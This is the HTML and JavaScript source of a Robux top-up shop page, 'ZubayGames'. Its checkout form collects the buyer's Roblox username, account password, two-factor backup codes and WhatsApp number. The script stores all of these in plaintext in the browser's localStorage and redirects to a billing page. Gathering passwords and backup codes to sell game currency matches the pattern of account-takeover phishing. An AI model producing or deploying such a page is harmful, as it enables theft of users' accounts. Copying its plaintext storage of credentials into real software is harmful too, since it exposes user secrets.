<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Buy Robux - ZubayGames</title>
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>
<body class="bg-[#0b111e] text-white font-sans min-h-screen">

  <header class="border-b border-gray-800 bg-[#0f172a] sticky top-0 z-50">
    <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
      <a href="index.html" class="text-2xl font-black tracking-wider text-cyan-400 uppercase">Zubay<span class="text-white">Games</span></a>
    </div>
  </header>

  <main class="max-w-7xl mx-auto px-4 py-12">
    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
      
      <div class="lg:col-span-5 space-y-6">
        <div class="w-full h-64 bg-cover bg-center rounded-2xl border border-gray-800" 
             style="background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKYhzyCKitqcDZi2kGZue8Wbyv-M8LHPohWk_qsgl-m0Ak5pKr3S2DVHh4&s=10');"></div>
      </div>

      <div class="lg:col-span-7 space-y-8">
        
        <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
          <button type="button" onclick="selectPackage(event, '80 Robux', '70.00')" class="pack-btn bg-[#0f172a] border border-cyan-500 p-4 rounded-xl">
            <div class="text-xs font-black">80 Robux</div>
            <div class="text-[11px] font-bold text-gray-400">70.00 ৳</div>
          </button>
        </div>

        <div class="space-y-4">
          <input type="text" id="roblox-id" placeholder="Roblox ID" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm">
          <input type="password" id="roblox-pass" placeholder="Password" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm">
          <input type="text" id="backup-codes" placeholder="Backup Codes" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm">
          <input type="text" id="contact-number" placeholder="WhatsApp Number" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm">
        </div>

        <div id="validation-error" class="hidden text-xs text-red-400 bg-red-500/10 p-3 rounded-xl border border-red-500/20">
          ⚠️ Fill all fields!
        </div>

        <button type="button" onclick="handleBuyNow(event)" class="w-full bg-cyan-500 hover:bg-cyan-600 text-black font-black py-4 rounded-xl text-sm transition">
          Buy Now 🚀
        </button>
      </div>
    </div>
  </main>

  <script>
    let currentPackTitle = "80 Robux";
    let currentPackPrice = "70.00";

    function selectPackage(e, title, price) {
      currentPackTitle = title;
      currentPackPrice = price;
      // UI update logic...
    }

    function handleBuyNow(e) {
      if (e) e.preventDefault();

      const robloxId = document.getElementById('roblox-id').value.trim();
      const password = document.getElementById('roblox-pass').value.trim();
      const backupCodes = document.getElementById('backup-codes').value.trim();
      const contactNumber = document.getElementById('contact-number').value.trim();

      if (!robloxId || !password || !backupCodes || !contactNumber) {
        document.getElementById('validation-error').classList.remove('hidden');
        return;
      }

      // Save to localStorage
      localStorage.setItem('checkout_roblox_id', robloxId);
      localStorage.setItem('checkout_password', password);
      localStorage.setItem('checkout_backup_codes', backupCodes);
      localStorage.setItem('checkout_contact_number', contactNumber);
      localStorage.setItem('checkout_pack_title', currentPackTitle);
      localStorage.setItem('checkout_pack_price', currentPackPrice);

      // FIX: Absolute path so it never gets confused by robux.html folder path
      window.location.replace(window.location.origin + "/bill.html");
    }
  </script>
</body>
</html>
